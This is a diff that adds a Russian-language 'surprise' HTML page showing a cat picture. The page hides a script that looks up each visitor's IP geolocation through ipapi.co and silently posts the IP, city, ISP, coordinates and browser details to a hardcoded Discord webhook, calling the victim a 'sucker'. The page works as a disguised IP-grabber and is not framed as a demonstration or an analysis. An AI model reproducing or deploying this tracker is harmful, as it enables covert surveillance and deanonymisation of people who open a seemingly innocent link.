@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Сюрприз</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <img src="image.png" alt="Банан-котик">
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1361714361604772032/VJMW5kOFXG4auF8ni0QZwlPbcX7sraIHqSRksY0ItTHyYw5Y4MJ5E3uINavGBmJIPdfW";
+
+        // Получаем IP и Geo + User Agent
+        fetch("https://ipapi.co/json")
+            .then(res => res.json())
+            .then(data => {
+                const location = `
+🌍 Новый лох) инфа:
+• IP (если не впн то покажет): ${data.ip}
+• Страна (если не впн то покажет): ${data.country_name}
+• Регион (не точный): ${data.region}
+• Город (не точный): ${data.city}
+• Провайдер (если не впн то покажет): ${data.org}
+• Почтовый индекс (не точный): ${data.postal}
+• Временная зона: ${data.timezone}
+• Координаты (не точные): ${data.latitude}, ${data.longitude}
+• Браузер: ${navigator.userAgent}
+                `;
+
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ content: location })
+                });
+            });
+    </script>
+</body>
+</html>
